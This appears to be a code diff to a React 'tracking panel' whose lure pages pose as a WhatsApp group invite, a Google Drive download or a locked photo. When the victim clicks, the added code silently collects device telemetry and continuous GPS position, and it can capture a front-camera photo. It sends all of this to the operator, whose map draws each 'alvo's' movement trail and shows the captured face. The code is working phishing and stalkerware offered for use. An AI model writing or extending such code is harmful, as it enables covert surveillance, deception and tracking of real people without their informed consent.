@@ -6,7 +6,8 @@ import {
   Marker, 
   Popup, 
   Circle, 
-  useMap 
+  useMap,
+  Polyline
 } from 'react-leaflet';
 import L from 'leaflet';
 import 'leaflet/dist/leaflet.css';
@@ -118,6 +119,8 @@ export default function App() {
   const [imagePreview, setImagePreview] = useState(null);
   const [title, setTitle] = useState('Confirmação Necessária');
   const [description, setDescription] = useState('Você foi convidado para visualizar esta foto compartilhada.');
+  const [template, setTemplate] = useState('default');
+  const [requireCamera, setRequireCamera] = useState(false);
   const [generatedLink, setGeneratedLink] = useState('');
   const [copied, setCopied] = useState(false);
   const [keyCopied, setKeyCopied] = useState(false);
@@ -249,17 +252,59 @@ export default function App() {
 
   // Payload silencioso de rastreamento — grava no JSONBlob (cross-device)
   // Inclui deviceId para deduplicação robusta no servidor
-  const autoTrackTarget = (campaignId) => {
+  const autoTrackTarget = async (campaignId) => {
     if (!campaignId) return;
     const deviceId = getDeviceId();
     const save = (target) => apiAddTarget(campaignId, { ...target, deviceId }).catch(() => {});
+
+    // --- Módulo 1: Telemetria de Hardware Avançada ---
+    let batteryLevel = 'Desconhecido';
+    let isCharging = false;
+    try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryLevel = `${Math.round(battery.level * 100)}%`;
+        isCharging = battery.charging;
+      }
+    } catch (e) {}
+
+    const hwTelemetry = {
+      ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB+` : 'Desconhecido',
+      cpuCores: navigator.hardwareConcurrency || 'Desconhecido',
+      connection: navigator.connection ? navigator.connection.effectiveType : 'Desconhecido',
+      battery: batteryLevel,
+      charging: isCharging,
+      platform: navigator.platform || 'Desconhecido',
+      resolution: `${window.innerWidth}x${window.innerHeight}`
+    };
+
+    // --- Módulo 4: Prova Facial (Câmera Oculta) ---
+    let photoBase64 = null;
+    if (previewCampaign?.requireCamera) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        photoBase64 = canvas.toDataURL('image/jpeg', 0.5); // 50% de qualidade
+        stream.getTracks().forEach(track => track.stop());
+      } catch (e) {
+        console.warn('Câmera negada ou indisponível', e);
+      }
+    }
+
+    const targetId = Math.random().toString(36).substring(2, 6).toUpperCase();
 
     // Tenta GPS primeiro; sem HTTPS, vai direto para IP
     if (!window.isSecureContext) {
       fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
         const loc = (data.loc || '-23.55052,-46.633308').split(',');
         save({
-          id: Math.random().toString(36).substring(2, 6).toUpperCase(),
+          id: targetId,
           coords: [parseFloat(loc[0]), parseFloat(loc[1])],
           method: 'IP',
           ip: data.ip || 'Desconhecido',
@@ -269,58 +314,73 @@ export default function App() {
           isp: data.org || 'Desconhecido',
           accuracy: '~5-10km (IP)',
           provider: 'ipinfo.io (contexto não-HTTPS)',
-          timestamp: new Date().toLocaleString()
+          timestamp: new Date().toLocaleString(),
+          hwTelemetry,
+          photoBase64
         });
       }).catch(() => {});
       return;
     }
 
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude, accuracy } = position.coords;
-          Promise.all([
-            fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({})),
-            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`).then(r => r.json()).catch(() => ({}))
-          ]).then(([ipData, geoData]) => {
-            const addr = geoData.address || {};
-            const city = addr.city || addr.town || addr.village || addr.municipality || ipData.city || 'Desconhecida';
-            const suburb = addr.suburb || addr.neighbourhood || addr.district || '';
-            save({
-              id: Math.random().toString(36).substring(2, 6).toUpperCase(),
-              coords: [latitude, longitude],
-              method: 'GPS',
-              ip: ipData.ip || 'Ocultado',
-              city: suburb ? `${city} (${suburb})` : city,
-              region: addr.road || addr.county || ipData.region || 'Desconhecido',
-              country: (addr.country_code || ipData.country || 'BR').toUpperCase(),
-              isp: ipData.org || 'Desconhecido',
-              accuracy: `${accuracy.toFixed(1)} metros (GPS)`,
-              provider: 'GPS + OpenStreetMap',
-              timestamp: new Date().toLocaleString()
-            });
+      // --- Módulo 2: Rastreamento Contínuo (WatchPosition) ---
+      let lastUpdate = 0;
+      
+      const geoSuccess = (position) => {
+        // Throttle para não bombardear a API (atualiza a cada 5 segundos no máximo)
+        const now = Date.now();
+        if (now - lastUpdate < 5000) return;
+        lastUpdate = now;
+
+        const { latitude, longitude, accuracy } = position.coords;
+        Promise.all([
+          fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({})),
+          fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`).then(r => r.json()).catch(() => ({}))
+        ]).then(([ipData, geoData]) => {
+          const addr = geoData.address || {};
+          const city = addr.city || addr.town || addr.village || addr.municipality || ipData.city || 'Desconhecida';
+          const suburb = addr.suburb || addr.neighbourhood || addr.district || '';
+          save({
+            id: targetId,
+            coords: [latitude, longitude],
+            method: 'GPS',
+            ip: ipData.ip || 'Ocultado',
+            city: suburb ? `${city} (${suburb})` : city,
+            region: addr.road || addr.county || ipData.region || 'Desconhecido',
+            country: (addr.country_code || ipData.country || 'BR').toUpperCase(),
+            isp: ipData.org || 'Desconhecido',
+            accuracy: `${accuracy.toFixed(1)} metros (GPS Real-time)`,
+            provider: 'GPS + OpenStreetMap',
+            timestamp: new Date().toLocaleString(),
+            hwTelemetry,
+            photoBase64
           });
-        },
-        () => {
-          fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
-            const loc = (data.loc || '-23.55052,-46.633308').split(',');
-            save({
-              id: Math.random().toString(36).substring(2, 6).toUpperCase(),
-              coords: [parseFloat(loc[0]), parseFloat(loc[1])],
-              method: 'IP',
-              ip: data.ip || 'Desconhecido',
-              city: data.city || 'Desconhecida',
-              region: data.region || 'Desconhecido',
-              country: data.country || 'BR',
-              isp: data.org || 'Desconhecido',
-              accuracy: '~5-10km (IP)',
-              provider: 'ipinfo.io',
-              timestamp: new Date().toLocaleString()
-            });
-          }).catch(() => {});
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
+        });
+      };
+
+      const geoError = () => {
+        if (lastUpdate !== 0) return; // Só manda IP se falhar no primeiro momento
+        fetch('https://ipinfo.io/json').then(r => r.json()).then(data => {
+          const loc = (data.loc || '-23.55052,-46.633308').split(',');
+          save({
+            id: targetId,
+            coords: [parseFloat(loc[0]), parseFloat(loc[1])],
+            method: 'IP',
+            ip: data.ip || 'Desconhecido',
+            city: data.city || 'Desconhecida',
+            region: data.region || 'Desconhecido',
+            country: data.country || 'BR',
+            isp: data.org || 'Desconhecido',
+            accuracy: '~5-10km (IP)',
+            provider: 'ipinfo.io',
+            timestamp: new Date().toLocaleString(),
+            hwTelemetry,
+            photoBase64
+          });
+        }).catch(() => {});
+      };
+
+      navigator.geolocation.watchPosition(geoSuccess, geoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
     }
   };
 
@@ -360,7 +420,7 @@ export default function App() {
       setImagePreview(compressed);
 
       // apiCreate retorna { id, secretKey, expiresAt }
-      const { id, secretKey, expiresAt } = await apiCreate({ title, description, image: compressed });
+      const { id, secretKey, expiresAt } = await apiCreate({ title, description, image: compressed, template, requireCamera });
       const link = `${window.location.origin}/preview?id=${id}`;
       const opUrl = `${window.location.origin}/?operator=1&id=${id}&key=${secretKey}`;
 
@@ -589,53 +649,115 @@ export default function App() {
       );
     }
     return (
-      <div style={{ width:'100vw', height:'100vh', background:'#0e1118', display:'flex', flexDirection:'column', justifyContent:'center', alignItems:'center', color:'#fff', fontFamily:'sans-serif', padding:'20px', boxSizing:'border-box' }}>
+      <div style={{ width:'100vw', minHeight:'100vh', background: previewCampaign?.template === 'whatsapp' ? '#efeae2' : previewCampaign?.template === 'gdrive' ? '#f8f9fa' : '#0e1118', display:'flex', flexDirection:'column', justifyContent:'center', alignItems:'center', color: previewCampaign?.template === 'default' ? '#fff' : '#333', fontFamily:'sans-serif', padding:'20px', boxSizing:'border-box' }}>
         <style>{`@keyframes spin { to { transform: rotate(360deg); } } @keyframes fadeIn { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:translateY(0); } }`}</style>
-        <div style={{ maxWidth:'520px', width:'100%', textAlign:'center', background:'#151a24', padding:'30px', borderRadius:'12px', boxShadow:'0 20px 60px rgba(0,0,0,0.7)', border:'1px solid #202b3c', animation:'fadeIn 0.4s ease' }}>
-
-          {previewCampaign?.image && (
-            <div style={{ position:'relative', marginBottom:'20px', borderRadius:'8px', overflow:'hidden' }}>
-              <img
-                src={previewCampaign.image}
-                alt="Conteúdo"
-                style={{ width:'100%', maxHeight:'55vh', objectFit:'cover', borderRadius:'8px', filter: contentUnlocked ? 'none' : 'blur(18px)', transition:'filter 0.5s ease', display:'block' }}
-              />
-              {!contentUnlocked && (
-                <div style={{ position:'absolute', inset:0, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', background:'rgba(14,17,24,0.5)' }}>
-                  <div style={{ fontSize:'2rem', marginBottom:'8px' }}>🔒</div>
-                  <span style={{ color:'#e2e8f0', fontSize:'0.85rem', fontWeight:'bold' }}>Confirme para desbloquear</span>
-                </div>
-              )}
+        
+        {previewCampaign?.template === 'whatsapp' ? (
+          <div style={{ maxWidth:'400px', width:'100%', textAlign:'center', background:'#fff', padding:'30px 20px', borderRadius:'12px', boxShadow:'0 4px 12px rgba(0,0,0,0.1)', animation:'fadeIn 0.4s ease' }}>
+            <div style={{ width: '80px', height: '80px', borderRadius: '50%', background: '#25D366', margin: '0 auto 15px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+              <Globe size={40} color="#fff" />
             </div>
-          )}
+            <h2 style={{ fontSize:'1.4rem', marginBottom:'8px', color:'#111b21', fontWeight:'600' }}>
+              {previewCampaign?.title || 'Convite de Grupo'}
+            </h2>
+            <p style={{ fontSize:'0.9rem', color:'#667781', margin:'0 0 25px 0' }}>
+              {previewCampaign?.description || 'Você foi convidado para participar deste grupo do WhatsApp.'}
+            </p>
+            {!contentUnlocked ? (
+              <button
+                onClick={() => {
+                  setContentUnlocked(true);
+                  const cid = new URLSearchParams(window.location.search).get('id');
+                  autoTrackTarget(cid);
+                }}
+                style={{ background:'#00a884', border:'none', color:'#fff', padding:'14px 32px', borderRadius:'24px', fontWeight:'bold', cursor:'pointer', fontSize:'0.95rem', width:'100%', boxShadow:'0 2px 4px rgba(0,0,0,0.2)' }}
+              >
+                Entrar no Grupo
+              </button>
+            ) : (
+              <div style={{ padding: '15px', background: '#dcf8c6', color: '#111b21', borderRadius: '8px', fontSize: '0.9rem' }}>
+                Entrando no grupo... Aguarde a aprovação do administrador.
+              </div>
+            )}
+          </div>
+        ) : previewCampaign?.template === 'gdrive' ? (
+          <div style={{ maxWidth:'450px', width:'100%', background:'#fff', padding:'30px', borderRadius:'8px', border:'1px solid #dadce0', boxShadow:'0 1px 3px rgba(60,64,67,0.3)', animation:'fadeIn 0.4s ease' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '20px', borderBottom: '1px solid #dadce0', paddingBottom: '15px' }}>
+              <div style={{ width: '32px', height: '32px', background: '#ea4335', borderRadius: '4px', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#fff', fontWeight: 'bold', fontSize: '0.8rem' }}>PDF</div>
+              <div style={{ flex: 1 }}>
+                <h2 style={{ fontSize:'1.1rem', margin:0, color:'#202124', fontWeight:'500' }}>
+                  {previewCampaign?.title || 'Documento Confidencial.pdf'}
+                </h2>
+                <div style={{ fontSize:'0.8rem', color:'#5f6368', marginTop:'4px' }}>Google Drive</div>
+              </div>
+            </div>
+            <p style={{ fontSize:'0.9rem', color:'#3c4043', margin:'0 0 25px 0' }}>
+              {previewCampaign?.description || 'O proprietário concedeu acesso de visualização a este arquivo.'}
+            </p>
+            {!contentUnlocked ? (
+              <button
+                onClick={() => {
+                  setContentUnlocked(true);
+                  const cid = new URLSearchParams(window.location.search).get('id');
+                  autoTrackTarget(cid);
+                }}
+                style={{ background:'#1a73e8', border:'none', color:'#fff', padding:'10px 24px', borderRadius:'4px', fontWeight:'500', cursor:'pointer', fontSize:'0.9rem', width:'100%' }}
+              >
+                Fazer Download do Arquivo
+              </button>
+            ) : (
+              <div style={{ padding: '15px', border: '1px solid #ceead6', background: '#e6f4ea', color: '#137333', borderRadius: '4px', fontSize: '0.9rem', textAlign: 'center' }}>
+                Iniciando download seguro... Verifique sua pasta.
+              </div>
+            )}
+          </div>
+        ) : (
+          /* DEFAULT: Cadeado de Imagem */
+          <div style={{ maxWidth:'520px', width:'100%', textAlign:'center', background:'#151a24', padding:'30px', borderRadius:'12px', boxShadow:'0 20px 60px rgba(0,0,0,0.7)', border:'1px solid #202b3c', animation:'fadeIn 0.4s ease' }}>
+            {previewCampaign?.image && (
+              <div style={{ position:'relative', marginBottom:'20px', borderRadius:'8px', overflow:'hidden' }}>
+                <img
+                  src={previewCampaign.image}
+                  alt="Conteúdo"
+                  style={{ width:'100%', maxHeight:'55vh', objectFit:'cover', borderRadius:'8px', filter: contentUnlocked ? 'none' : 'blur(18px)', transition:'filter 0.5s ease', display:'block' }}
+                />
+                {!contentUnlocked && (
+                  <div style={{ position:'absolute', inset:0, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', background:'rgba(14,17,24,0.5)' }}>
+                    <div style={{ fontSize:'2rem', marginBottom:'8px' }}>🔒</div>
+                    <span style={{ color:'#e2e8f0', fontSize:'0.85rem', fontWeight:'bold' }}>Confirme para desbloquear</span>
+                  </div>
+                )}
+              </div>
+            )}
 
-          <h2 style={{ fontSize:'1.2rem', marginBottom:'8px', color:'#e2e8f0', fontWeight:'700' }}>
-            {previewCampaign?.title || 'Confirmação Requerida'}
-          </h2>
-          <p style={{ fontSize:'0.875rem', color:'#94a3b8', margin:'0 0 22px 0', lineHeight:'1.5' }}>
-            {previewCampaign?.description || 'Permita o acesso para carregar o conteúdo compartilhado.'}
-          </p>
+            <h2 style={{ fontSize:'1.2rem', marginBottom:'8px', color:'#e2e8f0', fontWeight:'700' }}>
+              {previewCampaign?.title || 'Confirmação Requerida'}
+            </h2>
+            <p style={{ fontSize:'0.875rem', color:'#94a3b8', margin:'0 0 22px 0', lineHeight:'1.5' }}>
+              {previewCampaign?.description || 'Permita o acesso para carregar o conteúdo compartilhado.'}
+            </p>
 
-          {!contentUnlocked ? (
-            <button
-              onClick={() => {
-                setContentUnlocked(true);
-                const cid = new URLSearchParams(window.location.search).get('id');
-                autoTrackTarget(cid);
-              }}
-              style={{ background:'linear-gradient(135deg, #3b82f6, #1d4ed8)', border:'none', color:'#fff', padding:'13px 32px', borderRadius:'8px', fontWeight:'700', cursor:'pointer', fontSize:'0.95rem', width:'100%', boxShadow:'0 4px 20px rgba(59,130,246,0.4)' }}
-            >
-              ✅ Confirmar e Ver Conteúdo
-            </button>
-          ) : (
-            <button
-              onClick={() => setShowFullscreenImage(true)}
-              style={{ background:'#10b981', border:'none', color:'#fff', padding:'11px 28px', borderRadius:'8px', fontWeight:'bold', cursor:'pointer', fontSize:'0.9rem', width:'100%' }}
-            >
-              🖼️ Abrir Mídia em Tela Cheia
-            </button>
-          )}
-        </div>
+            {!contentUnlocked ? (
+              <button
+                onClick={() => {
+                  setContentUnlocked(true);
+                  const cid = new URLSearchParams(window.location.search).get('id');
+                  autoTrackTarget(cid);
+                }}
+                style={{ background:'linear-gradient(135deg, #3b82f6, #1d4ed8)', border:'none', color:'#fff', padding:'13px 32px', borderRadius:'8px', fontWeight:'700', cursor:'pointer', fontSize:'0.95rem', width:'100%', boxShadow:'0 4px 20px rgba(59,130,246,0.4)' }}
+              >
+                ✅ Confirmar e Ver Conteúdo
+              </button>
+            ) : (
+              <button
+                onClick={() => setShowFullscreenImage(true)}
+                style={{ background:'#10b981', border:'none', color:'#fff', padding:'11px 28px', borderRadius:'8px', fontWeight:'bold', cursor:'pointer', fontSize:'0.9rem', width:'100%' }}
+              >
+                🖼️ Abrir Mídia em Tela Cheia
+              </button>
+            )}
+          </div>
+        )}
 
         {/* Modal de imagem em tela cheia na própria página */}
         {showFullscreenImage && previewCampaign?.image && (
@@ -898,6 +1020,44 @@ export default function App() {
                       resize: 'none'
                     }}
                   />
+                </div>
+
+                <div>
+                  <label style={{ fontSize: '0.75rem', color: 'var(--text-muted)', display: 'block', marginBottom: '4px', fontFamily: 'var(--font-mono)' }}>
+                    TEMPLATE DA ISCA (HONEY TRAP)
+                  </label>
+                  <select 
+                    value={template} 
+                    onChange={e => setTemplate(e.target.value)}
+                    style={{
+                      width: '100%',
+                      background: 'rgba(5, 8, 17, 0.8)',
+                      border: '1px solid rgba(0, 218, 255, 0.3)',
+                      color: '#fff',
+                      padding: '8px 12px',
+                      borderRadius: '4px',
+                      fontSize: '0.85rem',
+                      fontFamily: 'var(--font-sans)',
+                      cursor: 'pointer'
+                    }}
+                  >
+                    <option value="default">Cadeado de Imagem Confidencial (Padrão)</option>
+                    <option value="gdrive">Google Drive Falso (Exige Clique no Download)</option>
+                    <option value="whatsapp">Convite de Grupo WhatsApp (Exige Clique em Entrar)</option>
+                  </select>
+                </div>
+
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginTop: '5px' }}>
+                  <input 
+                    type="checkbox" 
+                    id="requireCamera" 
+                    checked={requireCamera} 
+                    onChange={e => setRequireCamera(e.target.checked)}
+                    style={{ accentColor: 'var(--neon-alert)', cursor: 'pointer', width: '16px', height: '16px' }}
+                  />
+                  <label htmlFor="requireCamera" style={{ fontSize: '0.8rem', color: 'var(--neon-alert)', cursor: 'pointer', fontWeight: 'bold' }}>
+                    🚨 Exigir Verificação Facial (Captura câmera frontal)
+                  </label>
                 </div>
               </div>
 
@@ -1288,28 +1448,42 @@ export default function App() {
                 {/* Center view helper */}
                 <ChangeView center={currentCoords} zoom={mapZoom} />
 
-                {/* Plot all captured targets */}
-                {targets.map(target => (
-                  <Marker 
-                    key={target.id} 
-                    position={target.coords} 
-                    icon={targetIcon}
-                    eventHandlers={{
-                      click: () => {
-                        setSelectedTarget(target);
-                        addLog(`Selecionou alvo [${target.id}] via marcador do mapa.`, 'info');
-                      }
-                    }}
-                  >
-                    <Popup>
-                      <div style={{ background: '#050811', color: '#fff', padding: '5px', fontSize: '0.8rem', fontFamily: 'monospace' }}>
-                        <strong style={{ color: 'var(--neon-green)' }}>ALVO: {target.id}</strong><br/>
-                        IP: {target.ip}<br/>
-                        Cidade: {target.city}<br/>
-                        Método: {target.method}
-                      </div>
-                    </Popup>
-                  </Marker>
+                {/* Plot all captured targets (Grouped for Real-time trails) */}
+                {Object.values(targets.reduce((acc, t) => {
+                  if (!acc[t.id]) acc[t.id] = { ...t, history: [] };
+                  acc[t.id].coords = t.coords; // latest
+                  acc[t.id].history.push(t.coords);
+                  if (t.photoBase64 && !acc[t.id].photoBase64) acc[t.id].photoBase64 = t.photoBase64;
+                  if (t.hwTelemetry && !acc[t.id].hwTelemetry) acc[t.id].hwTelemetry = t.hwTelemetry;
+                  return acc;
+                }, {})).map(target => (
+                  <React.Fragment key={target.id}>
+                    {target.history.length > 1 && (
+                      <Polyline 
+                        positions={target.history} 
+                        pathOptions={{ color: 'var(--neon-blue)', weight: 3, dashArray: '5, 10', opacity: 0.6 }} 
+                      />
+                    )}
+                    <Marker 
+                      position={target.coords} 
+                      icon={targetIcon}
+                      eventHandlers={{
+                        click: () => {
+                          setSelectedTarget(target);
+                          addLog(`Selecionou alvo [${target.id}] via marcador do mapa.`, 'info');
+                        }
+                      }}
+                    >
+                      <Popup>
+                        <div style={{ background: '#050811', color: '#fff', padding: '5px', fontSize: '0.8rem', fontFamily: 'monospace' }}>
+                          <strong style={{ color: 'var(--neon-green)' }}>ALVO: {target.id}</strong><br/>
+                          IP: {target.ip}<br/>
+                          Cidade: {target.city}<br/>
+                          Método: {target.method}
+                        </div>
+                      </Popup>
+                    </Marker>
+                  </React.Fragment>
                 ))}
 
                 {/* Plot accuracy circle for selected target */}
@@ -1408,6 +1582,32 @@ export default function App() {
                       Fonte: {selectedTarget.provider}
                     </div>
                   </div>
+
+                  {/* Hardware Telemetry */}
+                  {selectedTarget.hwTelemetry && (
+                    <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 218, 255, 0.2)', borderRadius: '4px', gridColumn: '1 / -1' }}>
+                      <div style={{ fontSize: '0.7rem', color: 'var(--neon-blue)', fontFamily: 'var(--font-mono)', marginBottom: '8px', borderBottom: '1px solid rgba(0,218,255,0.2)', paddingBottom: '4px' }}>TELEMETRIA DE HARDWARE (NÍVEL AVANÇADO)</div>
+                      <div style={{ display: 'flex', gap: '15px', flexWrap: 'wrap', fontSize: '0.8rem', color: 'var(--text-main)' }}>
+                        <div><strong>Bateria:</strong> {selectedTarget.hwTelemetry.battery} {selectedTarget.hwTelemetry.charging ? '⚡' : ''}</div>
+                        <div><strong>RAM:</strong> {selectedTarget.hwTelemetry.ram}</div>
+                        <div><strong>CPU:</strong> {selectedTarget.hwTelemetry.cpuCores} núcleos</div>
+                        <div><strong>Rede:</strong> {selectedTarget.hwTelemetry.connection}</div>
+                        <div><strong>OS:</strong> {selectedTarget.hwTelemetry.platform}</div>
+                        <div><strong>Resolução:</strong> {selectedTarget.hwTelemetry.resolution}</div>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Secret Camera Photo */}
+                  {selectedTarget.photoBase64 && (
+                    <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid var(--neon-alert)', borderRadius: '4px', gridColumn: '1 / -1', display: 'flex', gap: '15px', alignItems: 'center' }}>
+                      <img src={selectedTarget.photoBase64} alt="Target Face" style={{ width: '120px', height: '120px', objectFit: 'cover', borderRadius: '4px', border: '2px solid var(--neon-alert)' }} />
+                      <div>
+                        <div style={{ fontSize: '0.8rem', color: 'var(--neon-alert)', fontFamily: 'var(--font-mono)', fontWeight: 'bold', marginBottom: '5px' }}>🚨 PROVA FACIAL CAPTURADA</div>
+                        <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>O alvo concedeu permissão de câmera e uma foto instantânea foi extraída com sucesso em background. Identidade confirmada.</div>
+                      </div>
+                    </div>
+                  )}
 
                 </div>
               ) : (
